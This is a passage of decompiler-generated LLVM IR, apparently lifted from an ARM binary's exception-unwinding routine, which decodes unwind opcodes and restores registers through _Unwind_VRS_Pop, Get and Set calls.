.thread3.dec_label_pc_188bc_crit_edge:            ; preds = %.thread3
  %v0_188bc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_188bc

dec_label_pc_188bc:                               ; preds = %.thread3.dec_label_pc_188bc_crit_edge, %dec_label_pc_188a8
  %v2_188d0 = phi i32 [ %v0_188bc.pre, %.thread3.dec_label_pc_188bc_crit_edge ], [ %v0_188a8, %dec_label_pc_188a8 ]
  %v1_188bc = add i32 %v2_188d0, 9
  %v2_188bc = inttoptr i32 %v1_188bc to i8*
  %v3_188bc = load i8, i8* %v2_188bc, align 1
  %v4_188bc = zext i8 %v3_188bc to i32
  store i32 %v4_188bc, i32* %r3.global-to-local, align 4
  %v2_188c0 = icmp eq i8 %v3_188bc, 0
  store i1 %v2_188c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_188c0, label %dec_label_pc_188fc, label %dec_label_pc_188cc

dec_label_pc_188cc:                               ; preds = %dec_label_pc_188bc
  %v1_188cc = add nsw i32 %v4_188bc, -1
  store i32 %v1_188cc, i32* %r3.global-to-local, align 4
  %v1_188d0 = trunc i32 %v1_188cc to i8
  store i8 %v1_188d0, i8* %v2_188bc, align 1
  %v0_188d4 = load i32, i32* @r5, align 4
  %v1_188d4 = add i32 %v0_188d4, 4
  %v2_188d4 = inttoptr i32 %v1_188d4 to i32*
  %v3_188d4 = load i32, i32* %v2_188d4, align 4
  store i32 %v3_188d4, i32* %r2.global-to-local, align 4
  %v1_188d8 = inttoptr i32 %v3_188d4 to i32*
  %v2_188d8 = load i32, i32* %v1_188d8, align 4
  store i32 %v2_188d8, i32* %r0.global-to-local, align 4
  %v4_188d8 = add i32 %v3_188d4, 4
  store i32 %v4_188d8, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_188d8, i32* %v2_188d4, align 4
  %v0_188e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_188e4 = trunc i32 %v0_188e4 to i8
  %v2_188e4 = load i32, i32* @r5, align 4
  %v3_188e4 = add i32 %v2_188e4, 8
  %v4_188e4 = inttoptr i32 %v3_188e4 to i8*
  store i8 %v1_188e4, i8* %v4_188e4, align 1
  %v0_188e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_188e8 = load i32, i32* @r5, align 4
  %v2_188e8 = inttoptr i32 %v1_188e8 to i32*
  store i32 %v0_188e8, i32* %v2_188e8, align 4
  br label %dec_label_pc_188ec

dec_label_pc_188ec:                               ; preds = %.thread3, %dec_label_pc_188cc
  %v0_188ec = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_188ec, i32* %r3.global-to-local, align 4
  %v3_188f0 = mul i32 %v0_188ec, 256
  store i32 %v3_188f0, i32* %r0.global-to-local, align 4
  %v1_188f4 = load i32, i32* @r5, align 4
  %v2_188f4 = inttoptr i32 %v1_188f4 to i32*
  store i32 %v3_188f0, i32* %v2_188f4, align 4
  %v0_188f8 = load i32, i32* %r3.global-to-local, align 4
  %v3_188f8 = udiv i32 %v0_188f8, 16777216
  br label %dec_label_pc_188fc

dec_label_pc_188fc:                               ; preds = %dec_label_pc_188bc, %dec_label_pc_188ec
  %storemerge133 = phi i32 [ %v3_188f8, %dec_label_pc_188ec ], [ 176, %dec_label_pc_188bc ]
  %v1_188fc = load i32, i32* %ip.global-to-local, align 4
  %v4_188fc = mul i32 %v1_188fc, 256
  %v5_188fc = or i32 %v4_188fc, %storemerge133
  store i32 %v5_188fc, i32* %r2.global-to-local, align 4
  %v7_18900 = icmp eq i32 %v5_188fc, 32768
  store i1 %v7_18900, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18900, label %dec_label_pc_18b0c, label %dec_label_pc_18908

dec_label_pc_18908:                               ; preds = %dec_label_pc_188fc
  %v3_18908 = mul i32 %v5_188fc, 16
  store i32 %v3_18908, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_18918 = and i32 %v3_18908, 65520
  store i32 %v3_18918, i32* %r2.global-to-local, align 4
  %v0_1891c = load i32, i32* @r7, align 4
  store i32 %v0_1891c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_18924 = call i32 @_Unwind_VRS_Pop(i32 %v0_1891c, i32 %v3_18918, i32 0, i32 0)
  store i32 %v4_18924, i32* %r0.global-to-local, align 4
  %v2_18928 = icmp eq i32 %v4_18924, 0
  store i1 %v2_18928, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18928, label %dec_label_pc_18930, label %dec_label_pc_18b0c

dec_label_pc_18930:                               ; preds = %dec_label_pc_18908
  %v0_18930 = load i32, i32* @r5, align 4
  %v1_18930 = add i32 %v0_18930, 8
  %v2_18930 = inttoptr i32 %v1_18930 to i8*
  %v3_18930 = load i8, i8* %v2_18930, align 1
  %v4_18930 = zext i8 %v3_18930 to i32
  store i32 %v4_18930, i32* %r3.global-to-local, align 4
  %v0_18934 = load i32, i32* @r4, align 4
  %v1_18934 = and i32 %v0_18934, 32768
  %v2_18934 = icmp eq i32 %v1_18934, 0
  store i1 %v2_18934, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18934, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_18930
  store i32 1, i32* @sl, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_18930, %bb147
  %v2_1893c = icmp eq i8 %v3_18930, 0
  store i1 %v2_1893c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1893c, label %dec_label_pc_1894c, label %.thread6

.thread6:                                         ; preds = %bb148
  %v2_18940 = add nsw i32 %v4_18930, -1
  store i32 %v2_18940, i32* %r3.global-to-local, align 4
  %v2_18944 = trunc i32 %v2_18940 to i8
  store i8 %v2_18944, i8* %v2_18930, align 1
  %v0_18948.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18948.pr.pr, label %.thread6.dec_label_pc_1894c_crit_edge, label %dec_label_pc_18878

.thread6.dec_label_pc_1894c_crit_edge:            ; preds = %.thread6
  %v0_1894c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1894c

dec_label_pc_1894c:                               ; preds = %bb148, %.thread6.dec_label_pc_1894c_crit_edge
  %v0_1894c = phi i32 [ %v0_1894c.pre, %.thread6.dec_label_pc_1894c_crit_edge ], [ %v0_18930, %bb148 ]
  %v1_1894c = add i32 %v0_1894c, 9
  %v2_1894c = inttoptr i32 %v1_1894c to i8*
  %v3_1894c = load i8, i8* %v2_1894c, align 1
  %v4_1894c = zext i8 %v3_1894c to i32
  store i32 %v4_1894c, i32* %r3.global-to-local, align 4
  %v2_18950 = icmp eq i8 %v3_1894c, 0
  store i1 %v2_18950, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18950, label %dec_label_pc_18958, label %dec_label_pc_1885c

dec_label_pc_18958:                               ; preds = %dec_label_pc_1894c, %dec_label_pc_18850, %dec_label_pc_18878
  %v0_18958 = load i32, i32* @sl, align 4
  %v2_18958 = icmp eq i32 %v0_18958, 0
  store i1 %v2_18958, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18958, label %dec_label_pc_18a20, label %bb149

bb149:                                            ; preds = %dec_label_pc_18958
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18964

dec_label_pc_18964:                               ; preds = %bb149, %dec_label_pc_18ed4, %dec_label_pc_18d74, %dec_label_pc_18b98, %dec_label_pc_18b50, %dec_label_pc_18b0c, %dec_label_pc_18a20
  %v1_1896c = phi i32 [ 0, %bb149 ], [ 9, %dec_label_pc_18ed4 ], [ 9, %dec_label_pc_18d74 ], [ 9, %dec_label_pc_18b98 ], [ 9, %dec_label_pc_18b50 ], [ 9, %dec_label_pc_18b0c ], [ %v0_18a54, %dec_label_pc_18a20 ]
  store i32 %v9_18828, i32* %r6.global-to-local, align 4
  store i32 %v21_18828, i32* @lr, align 4
  ret i32 %v1_1896c

dec_label_pc_18970:                               ; preds = %dec_label_pc_18894
  %v1_18970 = mul i32 %v0_18894, 4
  %v3_18974 = and i32 %v1_18970, 252
  store i32 %v3_18974, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_18980 = load i32, i32* @r7, align 4
  store i32 %v0_18980, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v1_18988 = add nuw nsw i32 %v3_18974, 4
  store i32 %v1_18988, i32* %r6.global-to-local, align 4
  %v5_18990 = call i32 @_Unwind_VRS_Get(i32 %v0_18980, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_18994 = load i32, i32* @r4, align 4
  %v1_18994 = and i32 %v0_18994, 64
  %v2_18994 = icmp eq i32 %v1_18994, 0
  store i1 %v2_18994, i1* %cpsr_z.global-to-local, align 1
  %v4_1899c = load i32, i32* %stack_var_-36, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_189a8 = load i32, i32* %r6.global-to-local, align 4
  %tmp181 = sub i32 0, %v2_189a8
  %storemerge160.p = select i1 %v2_18994, i32 %v2_189a8, i32 %tmp181
  %storemerge160 = add i32 %storemerge160.p, %v4_1899c
  store i32 %storemerge160, i32* %ip.global-to-local, align 4
  %storemerge135 = load i32, i32* @r7, align 4
  store i32 %storemerge135, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %storemerge160, i32* %stack_var_-36, align 4
  %v5_189c4 = call i32 @_Unwind_VRS_Set(i32 %storemerge135, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_189c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1883c.backedge

dec_label_pc_1883c.backedge:                      ; preds = %dec_label_pc_18970, %dec_label_pc_189ec, %dec_label_pc_18e70, %dec_label_pc_18b3c, %dec_label_pc_18b74, %dec_label_pc_18af4, %dec_label_pc_18d60
  %v0_1883c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1883c

dec_label_pc_189cc:                               ; preds = %dec_label_pc_1889c
  %v7_189cc = icmp eq i32 %v1_1889c, 144
  store i1 %v7_189cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_189cc, label %dec_label_pc_189d4, label %dec_label_pc_18b14

dec_label_pc_189d4:                               ; preds = %dec_label_pc_189cc
  %v1_189d4 = urem i32 %v0_18894, 16
  store i32 %v1_189d4, i32* %r2.global-to-local, align 4
  %v2_189d8 = icmp eq i32 %v1_189d4, 15
  store i1 %v2_189d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_189d8, label %.thread21, label %bb153

bb153:                                            ; preds = %dec_label_pc_189d4
  %v8_189dc = icmp eq i32 %v1_189d4, 13
  store i1 %v8_189dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_189dc, label %bb154, label %dec_label_pc_189ec

.thread21:                                        ; preds = %dec_label_pc_189d4
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_18b0c

bb154:                                            ; preds = %bb153
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_18b0c

dec_label_pc_189ec:                               ; preds = %bb153
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_189f8 = load i32, i32* @r7, align 4
  store i32 %v0_189f8, i32* %r0.global-to-local, align 4
  %v5_18a00 = call i32 @_Unwind_VRS_Get(i32 %v0_189f8, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_18a08 = load i32, i32* @r7, align 4
  store i32 %v0_18a08, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_18a18 = call i32 @_Unwind_VRS_Set(i32 %v0_18a08, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18a18, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1883c.backedge

dec_label_pc_18a20:                               ; preds = %dec_label_pc_18958
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_18a30 = load i32, i32* @r7, align 4
  store i32 %v0_18a30, i32* %r0.global-to-local, align 4
  %v7_18a38 = call i32 @_Unwind_VRS_Get(i32 %v0_18a30, i32 0, i32 14, i32 0, i8* %tmp146)
  %v0_18a3c = load i32, i32* @r7, align 4
  store i32 %v0_18a3c, i32* %r0.global-to-local, align 4
  %v0_18a40 = load i32, i32* @sl, align 4
  store i32 %v0_18a40, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v0_18a40, i32* %r3.global-to-local, align 4
  %v5_18a50 = call i32 @_Unwind_VRS_Set(i32 %v0_18a3c, i32 %v0_18a40, i32 15, i32 %v0_18a40, i8* bitcast (i32* @0 to i8*))
  %v0_18a54 = load i32, i32* @sl, align 4
  store i32 %v0_18a54, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18964

dec_label_pc_18a5c:                               ; preds = %dec_label_pc_18c50
  %v7_18a5c = icmp eq i32 %v0_18c50, 199
  store i1 %v7_18a5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18a5c, label %dec_label_pc_18d30, label %dec_label_pc_18a64

dec_label_pc_18a64:                               ; preds = %dec_label_pc_18a5c
  %v1_18a64 = and i32 %v0_18894, 248
  store i32 %v1_18a64, i32* %r3.global-to-local, align 4
  %v7_18a68 = icmp eq i32 %v1_18a64, 192
  store i1 %v7_18a68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18a68, label %.thread24, label %dec_label_pc_18a80

.thread24:                                        ; preds = %dec_label_pc_18a64
  %v2_18a6c = urem i32 %v0_18894, 16
  %v2_18a70 = add nuw nsw i32 %v2_18a6c, 1
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_18a78 = or i32 %v2_18a70, 655360
  store i32 %v2_18a78, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18b3c

dec_label_pc_18a80:                               ; preds = %dec_label_pc_18a64
  %v7_18a80 = icmp eq i32 %v0_18c50, 200
  store i1 %v7_18a80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18a80, label %dec_label_pc_18cc4, label %dec_label_pc_18a88

dec_label_pc_18a88:                               ; preds = %dec_label_pc_18a80
  %v7_18a88 = icmp eq i32 %v0_18c50, 201
  store i1 %v7_18a88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18a88, label %dec_label_pc_18a90, label %dec_label_pc_18b0c

dec_label_pc_18a90:                               ; preds = %dec_label_pc_18a88
  %v0_18a90 = load i32, i32* @r5, align 4
  %v1_18a90 = add i32 %v0_18a90, 8
  %v2_18a90 = inttoptr i32 %v1_18a90 to i8*
  %v3_18a90 = load i8, i8* %v2_18a90, align 1
  %v4_18a90 = zext i8 %v3_18a90 to i32
  store i32 %v4_18a90, i32* %r3.global-to-local, align 4
  %v2_18a94 = icmp eq i8 %v3_18a90, 0
  store i1 %v2_18a94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18a94, label %dec_label_pc_18aa4, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_18a90
  %v2_18a98 = add nsw i32 %v4_18a90, -1
  store i32 %v2_18a98, i32* %r3.global-to-local, align 4
  %v2_18a9c = trunc i32 %v2_18a98 to i8
  store i8 %v2_18a9c, i8* %v2_18a90, align 1
  %v0_18aa0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18aa0.pr.pr, label %.thread26.dec_label_pc_18aa4_crit_edge, label %dec_label_pc_18ad8

.thread26.dec_label_pc_18aa4_crit_edge:           ; preds = %.thread26
  %v0_18aa4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18aa4

dec_label_pc_18aa4:                               ; preds = %.thread26.dec_label_pc_18aa4_crit_edge, %dec_label_pc_18a90
  %v2_18abc = phi i32 [ %v0_18aa4.pre, %.thread26.dec_label_pc_18aa4_crit_edge ], [ %v0_18a90, %dec_label_pc_18a90 ]
  %v1_18aa4 = add i32 %v2_18abc, 9
  %v2_18aa4 = inttoptr i32 %v1_18aa4 to i8*
  %v3_18aa4 = load i8, i8* %v2_18aa4, align 1
  %v4_18aa4 = zext i8 %v3_18aa4 to i32
  store i32 %v4_18aa4, i32* %r3.global-to-local, align 4
  %v2_18aa8 = icmp eq i8 %v3_18aa4, 0
  store i1 %v2_18aa8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18aa8, label %dec_label_pc_18af4, label %dec_label_pc_18ab8

dec_label_pc_18ab8:                               ; preds = %dec_label_pc_18aa4
  %v1_18ab8 = add nsw i32 %v4_18aa4, -1
  store i32 %v1_18ab8, i32* %r3.global-to-local, align 4
  %v1_18abc = trunc i32 %v1_18ab8 to i8
  store i8 %v1_18abc, i8* %v2_18aa4, align 1
  %v0_18ac0 = load i32, i32* @r5, align 4
  %v1_18ac0 = add i32 %v0_18ac0, 4
  %v2_18ac0 = inttoptr i32 %v1_18ac0 to i32*
  %v3_18ac0 = load i32, i32* %v2_18ac0, align 4
  store i32 %v3_18ac0, i32* %r2.global-to-local, align 4
  %v1_18ac4 = inttoptr i32 %v3_18ac0 to i32*
  %v2_18ac4 = load i32, i32* %v1_18ac4, align 4
  store i32 %v2_18ac4, i32* %r0.global-to-local, align 4
  %v4_18ac4 = add i32 %v3_18ac0, 4
  store i32 %v4_18ac4, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_18ac4, i32* %v2_18ac0, align 4
  %v0_18ad0 = load i32, i32* %r3.global-to-local, align 4
  %v1_18ad0 = trunc i32 %v0_18ad0 to i8
  %v2_18ad0 = load i32, i32* @r5, align 4
  %v3_18ad0 = add i32 %v2_18ad0, 8
  %v4_18ad0 = inttoptr i32 %v3_18ad0 to i8*
  store i8 %v1_18ad0, i8* %v4_18ad0, align 1
  %v0_18ad4 = load i32, i32* %r0.global-to-local, align 4
  %v1_18ad4 = load i32, i32* @r5, align 4
  %v2_18ad4 = inttoptr i32 %v1_18ad4 to i32*
  store i32 %v0_18ad4, i32* %v2_18ad4, align 4
  br label %dec_label_pc_18ad8

dec_label_pc_18ad8:                               ; preds = %.thread26, %dec_label_pc_18ab8
  %v0_18ad8 = load i32, i32* %r0.global-to-local, align 4
  %v3_18ad8 = udiv i32 %v0_18ad8, 16777216
  %v1_18adc = urem i32 %v3_18ad8, 16
  %v3_18ae0 = mul i32 %v0_18ad8, 256
  %v1_18ae4 = add nuw nsw i32 %v1_18adc, 1
  store i32 %v1_18ae4, i32* %r1.global-to-local, align 4
  %v1_18ae8 = and i32 %v3_18ad8, 240
  store i32 %v1_18ae8, i32* %r3.global-to-local, align 4
  %v1_18aec = load i32, i32* @r5, align 4
  %v2_18aec = inttoptr i32 %v1_18aec to i32*
  store i32 %v3_18ae0, i32* %v2_18aec, align 4
  %v0_18af0 = load i32, i32* %r1.global-to-local, align 4
  %v1_18af0 = load i32, i32* %r3.global-to-local, align 4
  %v4_18af0 = mul i32 %v1_18af0, 4096
  %v5_18af0 = or i32 %v4_18af0, %v0_18af0
  br label %dec_label_pc_18af4

dec_label_pc_18af4:                               ; preds = %dec_label_pc_18aa4, %dec_label_pc_18ad8
  %storemerge = phi i32 [ %v5_18af0, %dec_label_pc_18ad8 ], [ 720897, %dec_label_pc_18aa4 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v0_18af4 = load i32, i32* @r7, align 4
  store i32 %v0_18af4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_18b00 = call i32 @_Unwind_VRS_Pop(i32 %v0_18af4, i32 1, i32 5, i32 5)
  store i32 %v4_18b00, i32* %r0.global-to-local, align 4
  %v2_18b04 = icmp eq i32 %v4_18b00, 0
  store i1 %v2_18b04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18b04, label %dec_label_pc_1883c.backedge, label %dec_label_pc_18b0c

dec_label_pc_18b0c:                               ; preds = %dec_label_pc_18d58, %dec_label_pc_18a88, %dec_label_pc_18b68, %dec_label_pc_18f0c, %dec_label_pc_18edc, %dec_label_pc_18eb8, %dec_label_pc_18d44, %dec_label_pc_18af4, %dec_label_pc_18908, %dec_label_pc_188fc, %bb154, %.thread21
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18964

dec_label_pc_18b14:                               ; preds = %dec_label_pc_189cc
  %v7_18b14 = icmp eq i32 %v1_1889c, 160
  store i1 %v7_18b14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18b14, label %dec_label_pc_18b1c, label %dec_label_pc_18b58

dec_label_pc_18b1c:                               ; preds = %dec_label_pc_18b14
  %v0_18b1c = load i32, i32* %ip.global-to-local, align 4
  %v1_18b1c = urem i32 %v0_18b1c, 8
  %v1_18b20 = xor i32 %v1_18b1c, 7
  store i32 %v1_18b20, i32* %r3.global-to-local, align 4
  %v6_18b28 = lshr i32 4080, %v1_18b20
  %v1_18b2c = and i32 %v0_18894, 8
  %v2_18b2c = icmp eq i32 %v1_18b2c, 0
  store i1 %v2_18b2c, i1* %cpsr_z.global-to-local, align 1
  %v1_18b30 = and i32 %v6_18b28, 4080
  %tmp155 = mul nuw nsw i32 %v1_18b2c, 2048
  %tmp156 = or i32 %v1_18b30, %tmp155
  store i32 %tmp156, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18b3c

dec_label_pc_18b3c:                               ; preds = %.thread44, %.thread24, %dec_label_pc_18ecc.dec_label_pc_18b3c_crit_edge, %bb157, %dec_label_pc_18d28, %dec_label_pc_18cbc, %dec_label_pc_18c1c, %dec_label_pc_18b1c
  %v2_18b44 = phi i32 [ %v2_18c40, %.thread44 ], [ %v2_18c48, %bb157 ], [ %v2_18b44.pre, %dec_label_pc_18ecc.dec_label_pc_18b3c_crit_edge ], [ %v2_18a78, %.thread24 ], [ %storemerge130, %dec_label_pc_18d28 ], [ %storemerge131, %dec_label_pc_18cbc ], [ %storemerge132, %dec_label_pc_18c1c ], [ %tmp156, %dec_label_pc_18b1c ]
  %v0_18b40 = phi i32 [ 2, %.thread44 ], [ 1, %bb157 ], [ 0, %dec_label_pc_18ecc.dec_label_pc_18b3c_crit_edge ], [ 3, %.thread24 ], [ 2, %dec_label_pc_18d28 ], [ 3, %dec_label_pc_18cbc ], [ 1, %dec_label_pc_18c1c ], [ 0, %dec_label_pc_18b1c ]
  %v0_18b3c = load i32, i32* @r7, align 4
  store i32 %v0_18b3c, i32* %r0.global-to-local, align 4
  store i32 %v0_18b40, i32* %r3.global-to-local, align 4
  %v4_18b44 = call i32 @_Unwind_VRS_Pop(i32 %v0_18b3c, i32 %v0_18b40, i32 %v2_18b44, i32 %v0_18b40)
  store i32 %v4_18b44, i32* %r0.global-to-local, align 4
  %v2_18b48 = icmp eq i32 %v4_18b44, 0
  store i1 %v2_18b48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18b48, label %dec_label_pc_1883c.backedge, label %dec_label_pc_18b50

dec_label_pc_18b50:                               ; preds = %dec_label_pc_18b3c
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18964

dec_label_pc_18b58:                               ; preds = %dec_label_pc_18b14
  %v7_18b58 = icmp eq i32 %v1_1889c, 176
  store i1 %v7_18b58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18b58, label %dec_label_pc_18ba0, label %dec_label_pc_18b60

dec_label_pc_18b60:                               ; preds = %dec_label_pc_18b58
  %v7_18b60 = icmp eq i32 %v1_1889c, 192
  store i1 %v7_18b60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18b60, label %dec_label_pc_18c50, label %dec_label_pc_18b68

dec_label_pc_18b68:                               ; preds = %dec_label_pc_18b60
  %v1_18b68 = and i32 %v0_18894, 248
  store i32 %v1_18b68, i32* %r3.global-to-local, align 4
  %v7_18b6c = icmp eq i32 %v1_18b68, 208
  store i1 %v7_18b6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18b6c, label %dec_label_pc_18b74, label %dec_label_pc_18b0c

dec_label_pc_18b74:                               ; preds = %dec_label_pc_18b68
  %v1_18b74 = urem i32 %v0_18894, 8
  %v1_18b78 = add nuw nsw i32 %v1_18b74, 1
  %v1_18b7c = or i32 %v1_18b78, 524288
  store i32 %v1_18b7c, i32* %r2.global-to-local, align 4
  %v0_18b80 = load i32, i32* @r7, align 4
  store i32 %v0_18b80, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_18b8c = call i32 @_Unwind_VRS_Pop(i32 %v0_18b80, i32 1, i32 %v1_18b7c, i32 5)
  store i32 %v4_18b8c, i32* %r0.global-to-local, align 4
  %v2_18b90 = icmp eq i32 %v4_18b8c, 0
  store i1 %v2_18b90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18b90, label %dec_label_pc_1883c.backedge, label %dec_label_pc_18b98

dec_label_pc_18b98:                               ; preds = %dec_label_pc_18b74
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18964

dec_label_pc_18ba0:                               ; preds = %dec_label_pc_18b58
  %v0_18ba0 = load i32, i32* %ip.global-to-local, align 4
  %v7_18ba0 = icmp eq i32 %v0_18ba0, 177
  store i1 %v7_18ba0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18ba0, label %dec_label_pc_18ea4, label %dec_label_pc_18ba8

dec_label_pc_18ba8:                               ; preds = %dec_label_pc_18ba0
  %v7_18ba8 = icmp eq i32 %v0_18ba0, 178
  store i1 %v7_18ba8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18ba8, label %dec_label_pc_18d7c, label %dec_label_pc_18bb0

dec_label_pc_18bb0:                               ; preds = %dec_label_pc_18ba8
  %v7_18bb0 = icmp eq i32 %v0_18ba0, 179
  store i1 %v7_18bb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18bb0, label %dec_label_pc_18bb8, label %dec_label_pc_18c24

dec_label_pc_18bb8:                               ; preds = %dec_label_pc_18bb0
  %v0_18bb8 = load i32, i32* @r5, align 4
  %v1_18bb8 = add i32 %v0_18bb8, 8
  %v2_18bb8 = inttoptr i32 %v1_18bb8 to i8*
  %v3_18bb8 = load i8, i8* %v2_18bb8, align 1
  %v4_18bb8 = zext i8 %v3_18bb8 to i32
  store i32 %v4_18bb8, i32* %r3.global-to-local, align 4
  %v2_18bbc = icmp eq i8 %v3_18bb8, 0
  store i1 %v2_18bbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18bbc, label %dec_label_pc_18bcc, label %.thread30

.thread30:                                        ; preds = %dec_label_pc_18bb8
  %v2_18bc0 = add nsw i32 %v4_18bb8, -1
  store i32 %v2_18bc0, i32* %r3.global-to-local, align 4
  %v2_18bc4 = trunc i32 %v2_18bc0 to i8
  store i8 %v2_18bc4, i8* %v2_18bb8, align 1
  %v0_18bc8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18bc8.pr.pr, label %.thread30.dec_label_pc_18bcc_crit_edge, label %dec_label_pc_18c00

.thread30.dec_label_pc_18bcc_crit_edge:           ; preds = %.thread30
  %v0_18bcc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18bcc

dec_label_pc_18bcc:                               ; preds = %.thread30.dec_label_pc_18bcc_crit_edge, %dec_label_pc_18bb8
  %v2_18be4 = phi i32 [ %v0_18bcc.pre, %.thread30.dec_label_pc_18bcc_crit_edge ], [ %v0_18bb8, %dec_label_pc_18bb8 ]
  %v1_18bcc = add i32 %v2_18be4, 9
  %v2_18bcc = inttoptr i32 %v1_18bcc to i8*
  %v3_18bcc = load i8, i8* %v2_18bcc, align 1
  %v4_18bcc = zext i8 %v3_18bcc to i32
  store i32 %v4_18bcc, i32* %r3.global-to-local, align 4
  %v2_18bd0 = icmp eq i8 %v3_18bcc, 0
  store i1 %v2_18bd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18bd0, label %dec_label_pc_18c1c, label %dec_label_pc_18be0

dec_label_pc_18be0:                               ; preds = %dec_label_pc_18bcc
  %v1_18be0 = add nsw i32 %v4_18bcc, -1
  store i32 %v1_18be0, i32* %r3.global-to-local, align 4
  %v1_18be4 = trunc i32 %v1_18be0 to i8
  store i8 %v1_18be4, i8* %v2_18bcc, align 1
  %v0_18be8 = load i32, i32* @r5, align 4
  %v1_18be8 = add i32 %v0_18be8, 4
  %v2_18be8 = inttoptr i32 %v1_18be8 to i32*
  %v3_18be8 = load i32, i32* %v2_18be8, align 4
  store i32 %v3_18be8, i32* %r2.global-to-local, align 4
  %v1_18bec = inttoptr i32 %v3_18be8 to i32*
  %v2_18bec = load i32, i32* %v1_18bec, align 4
  store i32 %v2_18bec, i32* %r0.global-to-local, align 4
  %v4_18bec = add i32 %v3_18be8, 4
  store i32 %v4_18bec, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_18bec, i32* %v2_18be8, align 4
  %v0_18bf8 = load i32, i32* %r3.global-to-local, align 4
  %v1_18bf8 = trunc i32 %v0_18bf8 to i8
  %v2_18bf8 = load i32, i32* @r5, align 4
  %v3_18bf8 = add i32 %v2_18bf8, 8
  %v4_18bf8 = inttoptr i32 %v3_18bf8 to i8*
  store i8 %v1_18bf8, i8* %v4_18bf8, align 1
  %v0_18bfc = load i32, i32* %r0.global-to-local, align 4
